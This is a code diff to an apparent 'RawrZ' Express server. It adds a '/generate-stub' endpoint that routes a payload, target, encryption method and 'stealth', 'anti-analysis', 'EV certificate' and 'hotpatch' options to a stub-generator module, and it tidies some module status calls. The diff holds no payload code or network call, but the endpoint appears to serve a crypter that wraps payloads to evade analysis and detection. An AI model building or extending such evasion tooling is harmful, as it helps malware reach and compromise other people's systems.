@@ -56,6 +56,41 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'panel.html'));
 });
 
+// Stub generation endpoint
+app.post('/generate-stub', async (req, res) => {
+    try {
+        const { target, stubType, encryptionMethod, stealthFeatures, antiAnalysisFeatures, evCertFeatures, hotpatchFeatures, payload, outputFormat, extension, customOptions } = req.body;
+        
+        // Route to stub-generator engine
+        const module = RawrZEngine.getLoadedModule('stub-generator');
+        const result = await module.generateStub(target, {
+            stubType,
+            encryptionMethod,
+            stealthFeatures,
+            antiAnalysisFeatures,
+            evCertFeatures,
+            hotpatchFeatures,
+            payload,
+            outputFormat,
+            extension,
+            customOptions
+        });
+        
+        res.json({
+            success: true,
+            data: result,
+            timestamp: new Date().toISOString()
+        });
+    } catch (error) {
+        console.error('Stub generation error:', error);
+        res.status(500).json({
+            success: false,
+            error: error.message,
+            timestamp: new Date().toISOString()
+        });
+    }
+});
+
 // Error handling middleware
 app.use((err, req, res, next) => {
     console.error('Error:', err);
@@ -527,8 +562,8 @@ app.post('/api/rawrz-engine/execute', async (req, res) => {
                     const module = await RawrZEngine.loadModule('camellia-assembly');
                     result = await module.compileAssembly(params.code, params.platform, params.options || {});
                 } else if (action === 'getStatus') {
-                    const module = await RawrZEngine.loadModule('camellia-assembly');
-                    result = await module.getStatus();
+                    const module = RawrZEngine.getLoadedModule('camellia-assembly');
+                    result = module.getStatus();
                 }
                 break;
                 
@@ -571,8 +606,8 @@ app.post('/api/rawrz-engine/execute', async (req, res) => {
                     const module = await RawrZEngine.loadModule('dual-crypto-engine');
                     result = await module.dualEncrypt(params.data, params.algorithms, params.options || {});
                 } else if (action === 'getStatus') {
-                    const module = await RawrZEngine.loadModule('dual-crypto-engine');
-                    result = await module.getStatus();
+                    const module = RawrZEngine.getLoadedModule('dual-crypto-engine');
+                    result = module.getStatus();
                 }
                 break;
                 
@@ -593,8 +628,8 @@ app.post('/api/rawrz-engine/execute', async (req, res) => {
                     const module = await RawrZEngine.loadModule('ev-cert-encryptor');
                     result = await module.evEncrypt(params.data, params.certificate, params.options || {});
                 } else if (action === 'getStatus') {
-                    const module = await RawrZEngine.loadModule('ev-cert-encryptor');
-                    result = await module.getStatus();
+                    const module = RawrZEngine.getLoadedModule('ev-cert-encryptor');
+                    result = module.getStatus();
                 }
                 break;
                 
